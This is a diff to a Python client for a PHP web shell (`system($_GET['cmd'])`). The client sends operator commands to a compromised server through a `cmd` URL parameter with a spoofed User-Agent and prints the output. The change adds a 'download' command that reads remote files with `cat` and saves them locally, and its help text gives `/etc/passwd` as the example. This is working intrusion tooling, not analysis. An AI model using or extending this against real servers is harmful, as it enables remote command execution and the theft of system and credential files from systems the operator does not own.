@@ -4,7 +4,7 @@ from optparse import OptionParser
 import urllib.parse
 import signal
 from  urllib.request import Request
-
+import os
 
 banner= """\33[92m
 
@@ -88,7 +88,7 @@ echo system($_GET['cmd']);
     if opt.url!=None and opt.gene==None:
         url=str(opt.url)
         print(banner)
-        print("\033[92m"+"Enter q to exit from shell\n"+"\033[92m")
+        print("\033[33m"+"Enter q  to exit from shell\n\ndownload file path  to download file\n\nexample:download /etc/passwd\n\n")
         while True:
             #buff=""
             cmd=str(input("\033[92m"+"$ "+"\033[92m"))
@@ -97,7 +97,7 @@ echo system($_GET['cmd']);
                 break
             param={"cmd":cmd}
             cmden=urllib.parse.urlencode(param)
-            #print(url+"?"+cmden)
+#            print(url+"?"+cmden)
             URL=Request(url+"?"+cmden,headers={'User-Agent':'Mozilla/24'})
             openurl=urllib.request.urlopen(URL)
             reponse=str(openurl.read().decode("utf-8"))
@@ -105,4 +105,16 @@ echo system($_GET['cmd']);
             #for i in soup
             print("\33[95m"+reponse.replace('\\n', '  \n')+"\33[95m")
             #print(soup.get_text())
-
+            if cmd.startswith("download"):
+                d=cmd.split(" ")
+                fd=d[1]
+                f=d[1].split("/")[-1]
+                #fd=str(input("\033[92m"+"Enter file name to download  "+"\033[92m"))
+                param={"cmd":"cat "}
+                cmden=urllib.parse.urlencode(param)
+                filen=urllib.parse.quote_plus(fd)
+                #f=fd.split("/")[-1]
+ #               print(url+"?"+cmden+filen)
+                #URL=Request(url+"?"+cmden+filen,headers={'User-Agent':'Mozilla/24'})
+                urllib.request.urlretrieve(url+"?"+cmden+filen,f)
+                print("\033[31m"+"[+]downloaded file  {}".format(os.getcwd()+"/"+f))
